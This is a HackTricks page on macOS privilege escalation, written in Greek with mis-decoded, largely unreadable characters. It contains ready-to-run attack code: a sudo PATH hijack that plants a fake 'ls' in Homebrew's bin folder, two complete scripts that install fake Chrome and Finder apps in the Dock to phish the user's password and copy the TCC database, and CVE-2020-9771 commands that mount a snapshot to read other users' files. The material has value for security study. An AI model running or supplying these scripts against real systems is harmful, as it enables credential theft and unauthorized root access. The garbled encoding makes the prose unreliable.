# Î•Ï€Î­ÎºÏ„Î±ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿ macOS

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## Î•Ï€Î­ÎºÏ„Î±ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ TCC

Î‘Î½ Î®ÏÎ¸Î±Ï„Îµ ÎµÎ´Ï ÏˆÎ¬Ï‡Î½Î¿Î½Ï„Î±Ï‚ Î³Î¹Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ TCC, Ï€Î·Î³Î±Î¯Î½ÎµÏ„Îµ ÏƒÏ„Î¿:

{% content-ref url="macos-security-protections/macos-tcc/" %}
[macos-tcc](macos-security-protections/macos-tcc/)
{% endcontent-ref %}

## Linux Privesc

Î Î±ÏÎ±ÎºÎ±Î»Î¿ÏÎ¼Îµ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **Î· Ï€Î»ÎµÎ¹Î¿ÏˆÎ·Ï†Î¯Î± Ï„Ï‰Î½ ÎºÏŒÎ»Ï€Ï‰Î½ Î³Î¹Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Ï€Î¿Ï… ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Ï…Î½ Ï„Î¿ Linux/Unix Î¸Î± ÎµÏ€Î·ÏÎµÎ¬ÏƒÎ¿Ï…Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î¹Ï‚ Î¼Î·Ï‡Î±Î½Î­Ï‚ MacOS**. ÎŸÏ€ÏŒÏ„Îµ Î´ÎµÎ¯Ï„Îµ:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## Î‘Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î§ÏÎ®ÏƒÏ„Î·

### Î‘Ï€Î¬Ï„Î· Ï„Î¿Ï… Sudo

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® [Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î±Ï€Î¬Ï„Î·Ï‚ Ï„Î¿Ï… Sudo Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î³Î¹Î± Ï„Î·Î½ Î•Ï€Î­ÎºÏ„Î±ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÏ„Î¿ Linux](../../linux-hardening/privilege-escalation/#sudo-hijacking).

Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï„Î¿ macOS **Î´Î¹Î±Ï„Î·ÏÎµÎ¯** Ï„Î¿ **`PATH`** Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿ **`sudo`**. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÎµÏ…Ï‡Î¸ÎµÎ¯ Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¸Î± Î®Ï„Î±Î½ Î½Î± **Î±Ï€Î±Ï„Î®ÏƒÎµÏ„Îµ Î¬Î»Î»Î± Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±** Ï€Î¿Ï… Î¿ Î¸ÏÎ¼Î± Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÏŒÏ„Î±Î½ **Ï„ÏÎ­Ï‡ÎµÎ¹ Ï„Î¿ sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ· ÏŒÏ„Î¹ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ Ï„ÎµÏÎ¼Î±Ï„Î¹ÎºÏŒ Î¸Î± Î­Ï‡ÎµÎ¹ Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ Ï„Î¿ **Homebrew**. ÎˆÏ„ÏƒÎ¹, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎºÎ±Ï„Î±Î»Î·Ï†Î¸Î¿ÏÎ½ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿ **`/opt/homebrew/bin`**.

### Î Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Ï„Î·Ï‚ Dock

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎºÎ¬Ï€Î¿Î¹Î¿ **ÎºÎ¿Î¹Î½Ï‰Î½Î¹ÎºÏŒ Î¼Î·Ï‡Î±Î½Î¹ÎºÏŒ** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€Î±ÏÎ±Ï€Î»Î±Î½Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï„Î¿ Google Chrome** Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ dock ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ Ï„Î¿ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ script:

{% tabs %}
{% tab title="Î Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Ï„Î¿Ï… Chrome" %}
ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÏÎ¿Ï„Î¬ÏƒÎµÎ¹Ï‚:

* Î•Î»Î­Î³Î¾Ï„Îµ ÏƒÏ„Î·Î½ dock Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î± Chrome ÎºÎ±Î¹ ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· **Î±Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ** Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ· ÎºÎ±Î¹ **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ** Ï„Î·Î½ **ÏˆÎµÏÏ„Î¹ÎºÎ·** ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ· Ï„Î¿Ï… Chrome ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± Î¸Î­ÏƒÎ· ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Ï„Î·Ï‚ dock.&#x20;
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{% endtab %}

{% tab title="Î Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Ï„Î¿Ï… Finder" %}
ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÏÎ¿Ï„Î¬ÏƒÎµÎ¹Ï‚:

* Î”ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÏ„Îµ Ï„Î¿Î½ Finder Î±Ï€ÏŒ Ï„Î· Î³ÏÎ±Î¼Î¼Î® ÎµÏÎ³Î±Î»ÎµÎ¯Ï‰Î½ (Dock), ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î±Î½ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î½Î± Ï„Î¿Î½ Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏˆÎµÏÏ„Î¹ÎºÎ¿ Finder Î´Î¯Ï€Î»Î± ÏƒÏ„Î¿Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ. Î“Î¹Î± Î±Ï…Ï„ÏŒ, Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ· Ï„Î¿Ï… ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï… Finder ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± Ï„Î·Ï‚ Î³ÏÎ±Î¼Î¼Î®Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Ï‰Î½ (Dock array).
* ÎœÎ¹Î± Î¬Î»Î»Î· ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Î½Î± Î¼Î·Î½ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Finder ÏƒÏ„Î· Î³ÏÎ±Î¼Î¼Î® ÎµÏÎ³Î±Î»ÎµÎ¯Ï‰Î½ (Dock) ÎºÎ±Î¹ Î±Ï€Î»Î¬ Î½Î± Ï„Î¿Î½ Î±Î½Î¿Î¯Î¾ÎµÏ„Îµ, Î· ÎµÏÏÏ„Î·ÏƒÎ· "ÎŸ Finder Î¶Î·Ï„Î¬ÎµÎ¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î¿Î½ Finder" Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎºÎ±Î¹ Ï„ÏŒÏƒÎ¿ Ï€Î±ÏÎ¬Î¾ÎµÎ½Î·.
* Î†Î»Î»ÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Î³Î¹Î± Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÏ„Îµ ÏƒÎµ root Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Îµ Î­Î½Î± Î±Ï€Î±Î¯ÏƒÎ¹Î¿ Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿, ÎµÎ¯Î½Î±Î¹ Î½Î± Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿Î½ Finder Î½Î± Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±:
* Î–Î·Ï„Î®ÏƒÏ„Îµ Î±Ï€ÏŒ Ï„Î¿Î½ Finder Î½Î± Î±Î½Ï„Î¹Î³ÏÎ¬ÏˆÎµÎ¹ Î­Î½Î± Î½Î­Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`sudo`** ÏƒÏ„Î¿ **`/etc/pam.d`** (Î— Ï€ÏÎ¿Ï„ÏÎ¿Ï€Î® Ï€Î¿Ï… Î¶Î·Ï„Î¬ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¸Î± Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ "ÎŸ Finder Î¸Î­Î»ÎµÎ¹ Î½Î± Î±Î½Ï„Î¹Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿ sudo")
* Î–Î·Ï„Î®ÏƒÏ„Îµ Î±Ï€ÏŒ Ï„Î¿Î½ Finder Î½Î± Î±Î½Ï„Î¹Î³ÏÎ¬ÏˆÎµÎ¹ Î­Î½Î± Î½Î­Î¿ **Authorization Plugin** (ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï…, Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î· Ï€ÏÎ¿Ï„ÏÎ¿Ï€Î® Ï€Î¿Ï… Î¶Î·Ï„Î¬ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ "ÎŸ Finder Î¸Î­Î»ÎµÎ¹ Î½Î± Î±Î½Ï„Î¹Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿ Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{% endtab %}
{% endtabs %}

## TCC - Î‘Î½Î­Î²Î±ÏƒÎ¼Î± Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÏƒÎµ Root

### CVE-2020-9771 - Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· TCC ÎºÎ±Î¹ Î±Î½Î­Î²Î±ÏƒÎ¼Î± Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î¼Îµ Ï„Î·Î½ mount\_apfs

**ÎŸÏ€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚** (Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î¼Î· Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿Ï‚) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÎ¹ Î­Î½Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Î¿Ï… time machine ÎºÎ±Î¹ Î½Î± **Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎŸÎ›Î‘ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î±** Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Î±Î½Ï„Î¹Î³ÏÎ¬Ï†Î¿Ï….\
Î¤Î¿ **Î¼ÏŒÎ½Î¿ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¿** Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ ÎµÎ¯Î½Î±Î¹ Î³Î¹Î± Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ (ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `Terminal`) Î½Î± Î­Ï‡ÎµÎ¹ **Î Î»Î®ÏÎ· Î ÏÏŒÏƒÎ²Î±ÏƒÎ· Î”Î¯ÏƒÎºÎ¿Ï…** (FDA) (`kTCCServiceSystemPolicyAllfiles`) Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡Î¿ÏÎ·Î³Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ Î­Î½Î±Î½ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®. 

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

ÎœÎ¹Î± Ï€Î¹Î¿ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎ®Ï‚ ÎµÎ¾Î®Î³Î·ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ [**ÏƒÏ„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î±Î½Î±Ï†Î¿ÏÎ¬**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

## Î•Ï…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î­Î»Î¹Î¾Î· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½:

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
